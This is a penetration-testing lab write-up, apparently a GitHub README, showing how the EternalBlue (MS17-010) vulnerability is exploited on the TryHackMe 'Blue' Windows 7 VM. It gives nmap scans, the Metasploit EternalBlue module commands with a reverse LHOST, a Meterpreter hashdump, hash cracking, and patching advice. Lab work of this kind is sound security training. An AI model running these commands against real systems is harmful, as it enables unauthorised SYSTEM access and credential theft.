#💣 Windows 7 EternalBlue – Penetration Testing Lab

Hands-on penetration testing lab exploiting MS17-010  (EternalBlue) on a vulnerable  Windows 7 system to achieve SYSTEM-level access and demonstrate post-exploitation risks.

--
##📌 Project Summary

This project demonstrates a full compromise of a Windows 7 vulnerable virtual machine (Blue) by exploiting the critical MS17-010 (EternalBlue) vulnerability.
The assessment covers reconnaissance, exploitation, and post-exploitation in a controlled lab environment.
##🧪 Lab Environment

Target: Windows 7 (Blue – Vulnerable VM)

Network: Local Virtual Lab (VMware / VirtualBox)

Target IP: 192.168.1.32

Tools: Nmap, Metasploit, Meterpreter, CrackStation

🔍 Attack Workflow

🔎 Reconnaissance
```bash
nmap -sC -sV -p 445 192.168.1.32
```
##🧨 Vulnerability Detection
```bash
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.32
```

##💥 Exploitation (EternalBlue)
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.32
set LHOST <Your_IP>
exploit
```

🔓 Post-Exploitation
```bash
sysinfo
hashdump
```


##Extracted NTLM hashes
Cracked credentials to demonstrate credential compromise risk
# Crack NTLM hashes
https://crackstation.net/

✅ Results

✔️ MS17-010 successfully exploited

✔️ SYSTEM-level access obtained

✔️ NTLM hashes dumped and cracked

✔️ Full system compromise achieved

🔐 Security Recommendations

Apply MS17-010 security patch

Disable SMBv1

Restrict TCP port 445

Monitor SMB traffic

🔗 References

Vulnerable Machine (Blue – Windows 7):
https://drive.google.com/file/d/11f_wsW59Dh1fGvQCNUPK70lIWzlcg44_/view

TryHackMe Room:
https://tryhackme.com/room/blue

Metasploit Exploit Reference:
https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/

👤 Author

Abanoub Ehab | BobXploit
Cybersecurity & Penetration Testing
